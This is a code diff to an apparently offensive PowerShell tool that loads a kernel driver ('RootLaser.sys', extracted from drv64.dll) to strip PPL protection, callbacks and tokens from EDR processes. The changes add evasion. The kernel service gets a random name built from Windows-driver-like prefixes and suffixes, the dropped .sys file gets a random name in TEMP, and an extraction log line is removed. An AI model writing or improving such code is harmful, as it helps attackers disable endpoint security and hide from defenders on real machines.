@@ -27,7 +27,7 @@
 param(
     [string]$Drv64Path = ".\drv64.dll",
     [string]$DriverPath = "",
-    [string]$ServiceName = "RLaserSvc",
+    [string]$ServiceName = "",
     [switch]$RemovePPL,
     [switch]$Callbacks,
     [switch]$TokenDowngrade,
@@ -67,7 +67,7 @@ function Show-Help {
     Write-Host "    -TargetPID <pids>   Target specific PIDs instead of EDR list"
     Write-Host "    -Drv64Path <path>   Path to drv64.dll (default: .\drv64.dll)"
     Write-Host "    -DriverPath <path>  Path to pre-extracted RootLaser.sys"
-    Write-Host "    -ServiceName <name> Kernel service name (default: RLaserSvc)"
+    Write-Host "    -ServiceName <name> Kernel service name (default: random)"
     Write-Host "    -DebugLog <path>    Write debug log to file"
     Write-Host "    -h                  Show this help"
     Write-Host ""
@@ -1236,15 +1236,22 @@ if (Test-Path $precompiledDll) {
 $tempSys = ""
 $hDev = [IntPtr]::Zero
 
+# Randomize service name if not specified
+if (-not $ServiceName) {
+    $prefixes = @("Wdf","Ndis","Wmi","Pnp","Ks","Um","Fs","Hid","Usb","Net","Sys","Win")
+    $suffixes = @("Drv","Mon","Flt","Bus","Hub","Mgr","Svc","Dev","Io","Cfg")
+    $ServiceName = $prefixes[(Get-Random -Maximum $prefixes.Count)] + $suffixes[(Get-Random -Maximum $suffixes.Count)] + (Get-Random -Minimum 10 -Maximum 99)
+}
+
 try {
     # Extract and load driver
     if ($DriverPath -and (Test-Path $DriverPath)) {
         $tempSys = (Resolve-Path $DriverPath).Path
     } else {
         $Drv64Path = (Resolve-Path $Drv64Path -ErrorAction Stop).Path
-        Write-Host "[*] Extracting from: $Drv64Path"
         $drvBytes = [PPLRemover]::ExtractDriverFromDB($Drv64Path)
-        $tempSys = Join-Path $env:TEMP "RootLaser.sys"
+        $rndName = [System.IO.Path]::GetRandomFileName().Replace('.','') + ".sys"
+        $tempSys = Join-Path $env:TEMP $rndName
         [System.IO.File]::WriteAllBytes($tempSys, $drvBytes)
     }
 
